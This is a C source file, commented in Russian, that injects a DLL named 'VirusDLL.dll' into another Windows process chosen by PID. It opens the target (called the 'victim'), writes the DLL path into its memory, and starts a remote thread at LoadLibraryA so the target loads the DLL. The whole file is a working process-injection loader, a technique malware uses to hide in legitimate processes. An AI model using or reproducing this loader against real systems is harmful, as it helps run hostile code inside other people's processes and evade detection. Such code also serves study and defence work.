
#include <Windows.h>
#include <winerror.h>

#include <stdio.h>

int main(int argc, char* argv[])
{
    char szDLLPathToInject[] = { "VirusDLL.dll" };
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1; // включая завершающий нулевой символ.
    /// szDLLPathToInject   — имя/путь DLL, которую загружаем в чужой процесс.
    /// nDLLPathLen         — длина строки пути без учёта завершающего '\0'.
    /// nTotBytesToAllocate — сколько байт выделить в цели: длина строки + 1 байт под '\0'.

    // 0. Открываем процесс.
    /// hProcess      — дескриптор целевого процесса для всех дальнейших вызовов.

        /// PROCESS_CREATE_THREAD  — право на создание потока в чужом процессе.
        /// PROCESS_VM_WRITE       — право на запись в виртуальную память жертвы.
        /// PROCESS_VM_OPERATION   — право на операции с виртуальной памятью (VirtualAllocEx).
    /// FALSE         — дочерние процессы не наследуют этот дескриптор.
    /// atoi(argv[1]) — PID цели из первого аргумента командной строки.
    HANDLE hProcess =
        OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, atoi(argv[1]));


    // 1. Выделяем память в удалённом процессе.
    /// lpHeapBaseAddress1 — базовый адрес буфера, выделенного в памяти цели.
    /// NULL               — адрес выбирает система.
    /// MEM_COMMIT         — сразу выделить (зафиксировать) физическую память.
    /// PAGE_READWRITE     — права на чтение и запись выделенной страницы.
    LPVOID lpHeapBaseAddress1 =
        VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate, MEM_COMMIT, PAGE_READWRITE);


    // 2. Записываем путь к DLL в выделенную память удалённого процесса.
    /// lNumberOfBytesWritten — сколько байт реально записано (для проверки).
    SIZE_T lNumberOfBytesWritten = 0;
    WriteProcessMemory(hProcess, lpHeapBaseAddress1, szDLLPathToInject, nTotBytesToAllocate, &lNumberOfBytesWritten);

    // 3.0. Получаем адрес функции LoadLibraryA из Kernel32.dll.
    LPTHREAD_START_ROUTINE lpLoadLibraryStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "LoadLibraryA");
    /// lpLoadLibraryStartAddress — адрес LoadLibraryA; одинаков во всех процессах, поэтому годится как точка входа потока.
    ///                             

    // 3.1. Вызываем LoadLibraryA в удалённом процессе, передавая адрес памяти с путём к DLL.
HANDLE hRemoteThread =
        CreateRemoteThread(hProcess, NULL, 0, lpLoadLibraryStartAddress, lpHeapBaseAddress1, 0, NULL);

    if (!hRemoteThread)
    {
        printf("[!] CreateRemoteThread Failed With Error : %d\n", GetLastError());
        printf("[!] Injection FAILED - could not create remote thread\n");

        // Очистка выделенной памяти
        VirtualFreeEx(hProcess, lpHeapBaseAddress1, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;  // возвращаем код ошибки
    }

    /// Ждём результат загрузки DLL
    WaitForSingleObject(hRemoteThread, INFINITE);

    DWORD dwExitCode = 0;
    GetExitCodeThread(hRemoteThread, &dwExitCode);

    if (dwExitCode == 0)
    {
        printf("[!] Injection FAILED - LoadLibraryA returned NULL - DLL failed to load!\n");
    } else
    {
        printf("[+] Injection succeeded, DLL loaded at: %d\n", dwExitCode);
    }
    
    CloseHandle(hProcess);
    return 0;
}